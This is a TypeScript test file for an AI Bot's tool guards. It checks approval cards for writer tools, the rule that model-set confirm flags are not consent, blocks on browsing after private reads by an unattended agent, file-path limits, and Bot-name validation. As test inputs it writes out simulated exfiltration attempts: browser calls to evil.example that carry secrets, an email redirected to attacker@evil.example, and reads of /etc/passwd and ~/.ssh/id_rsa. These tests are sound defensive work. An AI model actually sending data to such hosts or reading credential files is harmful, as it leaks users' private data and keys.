/**
 * Tool-face guards (design review R1): the interactive face never carries the
 * card-only dispatch tools or spawn_session, every Greenhouse writer is
 * approval-wrapped (model-set confirm flags are not consent) and its card shows
 * the whole call, `bot_tasks` only exists where tasks can run, the unattended
 * background face never combines private reads with opening pages, the Feishu
 * surface denies every Bot tool, and Bot names cannot forge speaker tags.
 */

import { afterEach, describe, expect, it, vi } from 'vitest';
import type { DatabaseProvider } from '@greenhouse/db';
import type { ToolRegistry } from '../../../agent.js';
import { DISPATCH_TOOL_IDS } from '../../../agent-runtime/tool-resolution.js';
import { FEISHU_DENIED_TOOL_IDS } from '../../../feishu/bot/conversation-key.js';
import { testTurn } from '../../__tests__/helpers/turn.js';
import { BOT_TOOL_IDS } from '../../tools/meta.js';
import { BOT_BACKGROUND_DENYLIST, backgroundMemberToolIds, guardBackgroundTools } from '../background.js';
import type { BotTurnContext } from '../context.js';
import type { ConversationPort, TeamPort } from '../ports.js';
import { buildStaticRules, toolFaceFlags } from '../prompt.js';
import { _setMcpDirectory } from '../../../mcp-client/directory.js';
import {
  approvalDetails,
  assembleInteractiveTools,
  createBotMcpCallTool,
  BOT_APPROVAL_TOOL_IDS,
  describeToolInput,
  interactiveMemberToolIds,
  needsBotApproval,
  withBotApproval,
} from '../tools-assembly.js';
import { nextFreeName, validateBotName } from '../naming.js';
import { toolAction } from '../copy.js';
import { clearAllDrafts, consumeDraftToken, createDraftToken } from '../../../email/security.js';

afterEach(() => {
  vi.unstubAllEnvs();
});

describe('interactive tool face', () => {
  it('drops dispatch tools, spawn_session and the special Bot ids from the member face', () => {
    const ids = interactiveMemberToolIds([
      'knowledge_query',
      'knowledge_mutation',
      'spawn_session',
      'memory',
      ...DISPATCH_TOOL_IDS,
      ...BOT_TOOL_IDS,
    ]);
    expect(ids).toEqual(['knowledge_query', 'knowledge_mutation', 'memory']);
  });

  it('gates every Greenhouse writer behind an approval', () => {
    for (const id of [
      'knowledge_mutation',
      'tables_mutation',
      'project_mutation',
      'workbench_mutation',
      'skill_mutation',
      'automation_mutation',
      'email_mutation',
      'feature_request',
    ]) {
      expect(needsBotApproval(id)).toBe(true);
    }
    expect(needsBotApproval('knowledge_query')).toBe(false);
    expect(needsBotApproval('memory')).toBe(false);
  });

  function ctxWith(decision: 'approve' | 'always' | 'deny' | 'expired', locale: 'en' | 'zh' = 'en') {
    return {
      locale,
      bot: { name: 'Sage' },
      requestApproval: vi.fn(async () => decision),
    } as unknown as BotTurnContext & { requestApproval: ReturnType<typeof vi.fn> };
  }

  it('titles the card with what the Bot will do, in the member’s words — never the raw tool name', async () => {
    const titleOf = async (toolId: string, locale: 'en' | 'zh', input: unknown = {}) => {
      const ctx = ctxWith('deny', locale);
      const wrapped = withBotApproval(toolId, { execute: vi.fn() }, ctx) as {
        execute: (input: unknown, options: unknown) => Promise<unknown>;
      };
      await wrapped.execute(input, {});
      return (ctx.requestApproval.mock.calls[0]![0] as { title: string }).title;
    };
    // The question alone: every card header already names the Bot.
    expect(await titleOf('knowledge_mutation', 'zh')).toBe('修改知识库？');
    expect(await titleOf('knowledge_mutation', 'en')).toBe('Edit the knowledge base?');
    // A draft sends nothing, so its card must not say "send".
    expect(await titleOf('email_mutation', 'zh', { action: 'draft' })).toBe('起草邮件？');
    expect(await titleOf('email_mutation', 'en', { action: 'send' })).toBe('Send an email?');
    expect(await titleOf('email_mutation', 'en', { action: 'constructor' })).toBe('Draft or send an email?');
    // Every built-in writer has its own phrase in both locales.
    for (const id of BOT_APPROVAL_TOOL_IDS) {
      for (const locale of ['en', 'zh'] as const) {
        expect(toolAction(locale, id), `${id} ${locale}`).toBeTruthy();
        expect(await titleOf(id, locale)).not.toMatch(/Mutation|_/);
      }
    }
    // A writer without one (an extension tool) falls back to its catalog name.
    expect(await titleOf('crm_mutation', 'zh')).toBe('使用「crm mutation」？');
    expect(await titleOf('crm_mutation', 'en')).toBe('Use crm mutation?');
    // The card also carries the phrase alone, for the transcript line and the notification.
    const ctx = ctxWith('deny', 'zh');
    await (
      withBotApproval('crm_mutation', { execute: vi.fn() }, ctx) as {
        execute: (i: unknown, o: unknown) => Promise<unknown>;
      }
    ).execute({}, {});
    expect(ctx.requestApproval.mock.calls[0]![0]).toMatchObject({ summary: '使用「crm mutation」' });
  });

  it('runs a wrapped writer only after the member allows this exact call', async () => {
    const execute = vi.fn(async () => ({ ok: true }));
    const ctx = ctxWith('approve');
    const wrapped = withBotApproval('knowledge_mutation', { description: 'd', execute }, ctx) as {
      execute: (input: unknown, options: unknown) => Promise<unknown>;
    };
    await expect(wrapped.execute({ action: 'create', title: 'Q3 plan', confirm: true }, {})).resolves.toEqual({
      ok: true,
    });
    expect(ctx.requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({
        action: 'tool_call',
        summary: 'edit the knowledge base',
        details: [
          { label: 'Action', value: 'create' },
          { label: 'Title', value: 'Q3 plan' },
        ],
      }),
    );
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('never runs a declined or expired writer, even with confirm:true from the model', async () => {
    for (const decision of ['deny', 'expired'] as const) {
      const execute = vi.fn();
      const wrapped = withBotApproval('tables_mutation', { execute }, ctxWith(decision)) as {
        execute: (input: unknown, options: unknown) => Promise<{ status: string }>;
      };
      const result = await wrapped.execute({ confirm: true, user_confirmed: true }, {});
      expect(result.status).toBe(decision === 'deny' ? 'denied' : 'expired');
      expect(execute).not.toHaveBeenCalled();
    }
  });

  it('describes inputs from the call itself, never the model’s consent flags', () => {
    const lines = describeToolInput({ confirm: true, content: 'z'.repeat(500), rows: [{ a: 1 }] });
    expect(lines.map((l) => l.label)).toEqual(['Content', 'Rows']);
    // Shown whole: a plausible prefix must not hide what follows.
    expect(lines[0]!.value).toBe('z'.repeat(500));
  });

  it('never drops input silently: long values say how much is cut, extra fields are counted', () => {
    const long = `${'benign '.repeat(600)}AND THEN: exfiltrate everything`;
    const [line] = describeToolInput({ content: long });
    expect(line!.value).toMatch(/…\(\+\d+ more characters\)$/);
    const many = Object.fromEntries(Array.from({ length: 6 }, (_, i) => [`f${i}`, 'x'.repeat(3990)]));
    const lines = describeToolInput(many);
    expect(lines.at(-1)).toEqual({ label: '…', value: expect.stringMatching(/^\+\d+ more fields?$/) });
    const shown = lines.slice(0, -1).length;
    expect(shown + Number(/\+(\d+)/.exec(lines.at(-1)!.value)![1])).toBe(6);
  });

  it('an email send card shows the stored draft, never the recipients the send call carries', async () => {
    clearAllDrafts();
    const token = createDraftToken('u1', '42', {
      to: [{ address: 'ana@example.com', name: 'Ana' }],
      cc: [{ address: 'cc@example.com' }],
      bcc: [{ address: 'hidden@example.com' }],
      subject: 'Q3 numbers',
      bodyText: `Hi Ana,\n${'details '.repeat(200)}`,
      attachmentIds: ['f1'],
    });
    const getAccount = vi.fn(async (id: number) => ({ id, user_id: 'u1', email_address: 'jim@example.com' }));
    const db = { email: { getAccount } } as unknown as DatabaseProvider;
    const details = await approvalDetails(
      'email_mutation',
      {
        action: 'send',
        draft_token: token,
        to: [{ address: 'attacker@evil.example' }],
        subject: 'innocent',
        body: 'innocent',
        user_confirmed: true,
      },
      { db, userId: 'u1' },
    );
    const byLabel = Object.fromEntries(details.map((d) => [d.label, d.value]));
    expect(byLabel).toMatchObject({
      Action: 'send',
      From: 'jim@example.com',
      To: 'Ana <ana@example.com>',
      Cc: 'cc@example.com',
      Bcc: 'hidden@example.com',
      Subject: 'Q3 numbers',
      Attachments: '1 file',
    });
    // The token is plumbing: the card shows the draft it names instead.
    expect(JSON.stringify(details)).not.toContain(token);
    expect(byLabel.Body).toMatch(/^Hi Ana,\n/);
    expect(byLabel.Body).toMatch(/…\(\+\d+ more characters\)$/);
    expect(JSON.stringify(details)).not.toContain('evil.example');
    expect(JSON.stringify(details)).not.toContain('innocent');
    expect(getAccount).toHaveBeenCalledWith(42);
    // Peeking does not consume: the send still finds its draft.
    expect(consumeDraftToken(token, 'u1')?.subject).toBe('Q3 numbers');
  });

  it('labels the rows in the member’s locale, keeps the values verbatim and hides only plumbing', async () => {
    const input = {
      action: 'knowledge.update_doc',
      doc_id: 'kb_42',
      content: 'y'.repeat(4100),
      revision: 7,
      confirm: true,
      some_new_field: 'x',
    };
    const zh = describeToolInput(input, 'zh');
    expect(zh.map((l) => l.label)).toEqual(['操作', '文档 ID', '内容', 'Some new field']);
    expect(zh[0]!.value).toBe('knowledge.update_doc');
    expect(zh[1]!.value).toBe('kb_42');
    // The truncation marker is protocol: the clients parse it and translate it themselves.
    expect(zh[2]!.value).toMatch(/…\(\+100 more characters\)$/);
    expect(JSON.stringify(zh)).not.toMatch(/revision|confirm|"7"/);
    expect(describeToolInput(input, 'en').map((l) => l.label)).toEqual([
      'Action',
      'Document ID',
      'Content',
      'Some new field',
    ]);

    clearAllDrafts();
    const token = createDraftToken('u1', 'shared', { to: [{ address: 'ana@example.com' }], subject: 'Hi' });
    const db = { email: { getAccount: vi.fn() } } as unknown as DatabaseProvider;
    const card = await approvalDetails(
      'email_mutation',
      { action: 'send', draft_token: token },
      { db, userId: 'u1' },
      'zh',
    );
    expect(card.map((l) => l.label)).toEqual(['操作', '发件人', '收件人', '主题', '说明']);
    expect(card.at(-1)!.value).toMatch(/按上面显示的已存草稿原样发送/);
    const missing = await approvalDetails(
      'email_mutation',
      { action: 'send', draft_token: 'nope' },
      { db, userId: 'u1' },
      'zh',
    );
    expect(missing.at(-1)).toEqual({ label: '说明', value: expect.stringMatching(/不会发出任何邮件/) });
  });

  it('an email send card for a missing or foreign draft says nothing will be sent', async () => {
    clearAllDrafts();
    const foreign = createDraftToken('someone-else', '7', { to: [{ address: 'x@example.com' }], subject: 'theirs' });
    const db = { email: { getAccount: vi.fn() } } as unknown as DatabaseProvider;
    for (const token of ['ZZZZZZ', foreign]) {
      const details = await approvalDetails(
        'email_mutation',
        { action: 'send', draft_token: token },
        { db, userId: 'u1' },
      );
      expect(details.map((d) => d.label)).toEqual(['Action', 'Note']);
      expect(details.at(-1)!.value).toMatch(/sends nothing/);
      expect(JSON.stringify(details)).not.toContain('theirs');
    }
  });
});

describe('bot_tasks only where background tasks can run', () => {
  const team: TeamPort = {
    members: () => [],
    others: () => [],
    checkAsk: () => null,
    acceptAsk: async () => undefined,
    addMember: async () => ({ ok: true }),
  };
  const conversation: ConversationPort = { nickname: 'Jim', botName: () => null, recallMaxSeq: () => -1 };
  const assemble = () =>
    assembleInteractiveTools({
      db: {} as DatabaseProvider,
      ctx: testTurn(),
      toolRegistry: {},
      effectiveTools: [],
      team,
      conversation,
      runtimeRunId: null,
    });

  it('is offered by default', () => {
    const { tools, approvalGated } = assemble();
    expect(Object.keys(tools)).toContain('bot_tasks');
    expect(buildStaticRules(toolFaceFlags(Object.keys(tools), approvalGated), 'en')).toContain(
      'belongs in a background task',
    );
  });

  for (const env of ['RUNTIME_SUBAGENT_DRIVER_ENABLED', 'RUNTIME_WORKER_ENABLED']) {
    it(`is not offered (and S1 does not promise it) when ${env}=0`, () => {
      vi.stubEnv(env, '0');
      const { tools, approvalGated } = assemble();
      expect(Object.keys(tools)).not.toContain('bot_tasks');
      expect(buildStaticRules(toolFaceFlags(Object.keys(tools), approvalGated), 'en')).not.toContain(
        'belongs in a background task',
      );
    });
  }
});

describe('external connectors (mcp_call) in a Bots turn', () => {
  const team = {} as TeamPort;
  const conversation = {} as ConversationPort;
  const tools = [
    {
      name: 'list_issues',
      description: 'List issues',
      input_schema: { type: 'object' },
      read_only: true,
      destructive: false,
    },
    {
      name: 'create_issue',
      description: 'Create an issue',
      input_schema: { type: 'object' },
      read_only: false,
      destructive: false,
    },
  ];

  afterEach(() => _setMcpDirectory([]));

  it('is part of the interactive face (it was excluded before connectors had cards and taint)', () => {
    expect(interactiveMemberToolIds(['knowledge_query', 'mcp_call'])).toEqual(['knowledge_query', 'mcp_call']);
  });

  it("is built with the card face: no confirm flag, and only the Bot's connectors", () => {
    _setMcpDirectory([
      { id: 1, slug: 'linear', name: 'Linear', description: null, auth_mode: 'oauth', tools },
      { id: 2, slug: 'docs', name: 'Docs', description: null, auth_mode: 'none', tools },
    ]);
    const ctx = testTurn();
    ctx.bot = { ...ctx.bot, connectors: JSON.stringify(['linear']) };
    const { tools: face, approvalGated } = assembleInteractiveTools({
      db: {} as DatabaseProvider,
      ctx,
      toolRegistry: {},
      effectiveTools: ['mcp_call'],
      team,
      conversation,
      runtimeRunId: null,
    });
    const mcp = face.mcp_call as { description?: string };
    expect(mcp).toBeDefined();
    expect(approvalGated).toBe(true);
    expect(mcp.description).toContain('"linear" — Linear [own account]');
    expect(mcp.description).not.toContain('"docs"');
    expect(mcp.description).toContain('approval card');
    expect(mcp.description).not.toContain('confirm:true');
  });

  it('a Bot whose list names no installed connector gets no gateway at all', () => {
    _setMcpDirectory([{ id: 2, slug: 'docs', name: 'Docs', description: null, auth_mode: 'none', tools }]);
    const ctx = testTurn();
    ctx.bot = { ...ctx.bot, connectors: '[]' };
    const { tools: face } = assembleInteractiveTools({
      db: {} as DatabaseProvider,
      ctx,
      toolRegistry: {},
      effectiveTools: ['mcp_call'],
      team,
      conversation,
      runtimeRunId: null,
    });
    expect(face.mcp_call).toBeUndefined();
  });

  it('asks on a card titled with the connector and tool, showing the exact arguments', async () => {
    const ctx = testTurn();
    const requestApproval = vi.fn(async (_payload: unknown) => 'deny' as const);
    ctx.requestApproval = requestApproval;
    _setMcpDirectory([{ id: 1, slug: 'linear', name: 'Linear', description: null, auth_mode: 'none', tools }]);
    const db = {
      mcpServers: {
        getById: async () => ({
          id: 1,
          slug: 'linear',
          name: 'Linear',
          url: 'http://127.0.0.1:9/mcp',
          transport: 'streamable_http',
          auth_mode: 'none',
          enabled: true,
        }),
      },
    } as unknown as DatabaseProvider;
    const tool = createBotMcpCallTool({ ...ctx, db }) as unknown as {
      execute: (input: unknown, options: unknown) => Promise<Record<string, unknown>>;
    };
    const out = await tool.execute(
      { action: 'call', server: 'linear', tool: 'create_issue', arguments: { title: 'Printer on fire' } },
      { toolCallId: 't', messages: [] },
    );
    expect(out.status).toBe('denied');
    const card = requestApproval.mock.calls[0]![0] as {
      title: string;
      details: Array<{ label: string; value: string }>;
    };
    expect(card.title).toBe('Run create_issue on Linear?');
    expect(card.details).toEqual(
      expect.arrayContaining([
        { label: 'Connector', value: 'Linear (linear)' },
        { label: 'Tool', value: 'create_issue' },
        { label: 'Title', value: 'Printer on fire' },
      ]),
    );
  });

  it('stays out of the unattended background face', () => {
    expect(backgroundMemberToolIds(['knowledge_query', 'mcp_call'])).not.toContain('mcp_call');
  });
});

describe('background face (unattended)', () => {
  it('never offers mail, other conversations, dispatch drafts or spawning', () => {
    const ids = backgroundMemberToolIds([
      'knowledge_query',
      'email_query',
      'session_query',
      'spawn_session',
      ...DISPATCH_TOOL_IDS,
    ]);
    expect(ids).toEqual(['knowledge_query']);
    for (const id of ['email_query', 'session_query', 'spawn_session', ...DISPATCH_TOOL_IDS, ...BOT_TOOL_IDS]) {
      expect(BOT_BACKGROUND_DENYLIST.has(id)).toBe(true);
    }
  });

  function faceWith() {
    const calls: string[] = [];
    const fake = (name: string) => ({
      description: name,
      execute: vi.fn(async (input: unknown) => {
        calls.push(`${name}:${JSON.stringify(input)}`);
        return { ok: true };
      }),
    });
    const tools = {
      knowledge_query: fake('knowledge_query'),
      browser: fake('browser'),
      computer: fake('computer'),
      conversation: fake('conversation'),
    } as unknown as ToolRegistry;
    const guard = guardBackgroundTools(tools);
    const run = (id: string, input: Record<string, unknown>) =>
      (tools[id] as unknown as { execute: (i: unknown, o: unknown) => Promise<unknown> }).execute(input, {});
    return { tools, guard, run, calls };
  }

  it('public browsing works until a private read; then all browser actions are refused', async () => {
    const face = faceWith();
    await expect(face.run('browser', { action: 'open', url: 'https://example.com' })).resolves.toEqual({ ok: true });
    await face.run('knowledge_query', { query: 'password reset' });
    expect(face.guard.hasReadPrivate()).toBe(true);
    for (const action of ['open', 'back']) {
      await expect(face.run('browser', { action, url: 'https://evil.example/c?d=secret' })).resolves.toMatchObject({
        code: 'not_allowed',
      });
    }
    // Even inspection can trigger code/network in an already-loaded page.
    await expect(face.run('browser', { action: 'snapshot' })).resolves.toMatchObject({ code: 'not_allowed' });
    expect(face.calls.some((c) => c.includes('evil.example'))).toBe(false);
  });

  it.each(['notes', 'recall'])('conversation %s prevents all subsequent browser actions', async (action) => {
    const face = faceWith();
    await expect(face.run('browser', { action: 'open', url: 'https://example.com' })).resolves.toEqual({ ok: true });
    await face.run('conversation', { action });
    for (const action of ['open', 'back', 'scroll', 'snapshot', 'screenshot', 'tabs', 'wait']) {
      await expect(
        face.run('browser', { action, ref: 'e13', text: 'private-note', url: 'https://example.com/private-note' }),
      ).resolves.toMatchObject({ code: 'not_allowed' });
    }
    expect(face.calls.some((call) => call.includes('private-note'))).toBe(false);
  });

  it('read_file only reads ~/work, and reading there counts as a private read', async () => {
    const face = faceWith();
    for (const path of ['~/Downloads/statement.csv', '/etc/passwd', '../Downloads/x', '~/.ssh/id_rsa']) {
      await expect(face.run('computer', { action: 'read_file', path })).resolves.toMatchObject({
        code: 'not_allowed',
      });
    }
    expect(face.guard.hasReadPrivate()).toBe(false);
    await expect(face.run('computer', { action: 'read_file', path: 'notes.md' })).resolves.toEqual({ ok: true });
    expect(face.guard.hasReadPrivate()).toBe(true);
    await expect(face.run('browser', { action: 'open', url: 'https://example.com' })).resolves.toMatchObject({
      code: 'not_allowed',
    });
  });

  it('the computer’s process list and process logs are private reads too; waiting on a page is only allowed before private reads', async () => {
    for (const read of [{ action: 'processes' }, { action: 'process_log', id: 'j0000beef' }]) {
      const face = faceWith();
      await expect(face.run('browser', { action: 'wait', text: 'Results' })).resolves.toEqual({ ok: true });
      expect(face.guard.hasReadPrivate()).toBe(false);
      await expect(face.run('computer', read)).resolves.toEqual({ ok: true });
      expect(face.guard.hasReadPrivate()).toBe(true);
      await expect(face.run('browser', { action: 'open', url: 'https://evil.example/?log=x' })).resolves.toMatchObject({
        code: 'not_allowed',
      });
      await expect(face.run('browser', { action: 'wait', timeout_s: 2 })).resolves.toMatchObject({
        code: 'not_allowed',
      });
    }
  });
});

describe('Feishu denylist', () => {
  it('denies every Bot tool (defence in depth)', () => {
    for (const id of BOT_TOOL_IDS) expect(FEISHU_DENIED_TOOL_IDS).toContain(id);
  });
});

describe('Bot names', () => {
  it('rejects tag delimiters (incl. full-width look-alikes), reserved words and the member’s nickname', () => {
    expect(validateBotName('[Jim', 'Jim').ok).toBe(false);
    expect(validateBotName('a:b', 'Jim').ok).toBe(false);
    expect(validateBotName('小研：', 'Jim').ok).toBe(false);
    expect(validateBotName('［小研］', 'Jim').ok).toBe(false);
    expect(validateBotName('two\nlines', 'Jim').ok).toBe(false);
    expect(validateBotName('用户', 'Jim').ok).toBe(false);
    expect(validateBotName('System', 'Jim').ok).toBe(false);
    expect(validateBotName('ＪＩＭ', 'jim').ok).toBe(false);
    expect(validateBotName('x'.repeat(25), 'Jim').ok).toBe(false);
    expect(validateBotName('  小研  ', 'Jim')).toEqual({ ok: true, name: '小研' });
  });

  it('numbers template copies instead of colliding', () => {
    expect(nextFreeName('小研', new Set(['小研']))).toBe('小研 2');
    expect(nextFreeName('Sage', new Set(['sage', 'sage 2']))).toBe('Sage 3');
    expect(nextFreeName('Sage', new Set())).toBe('Sage');
  });
});
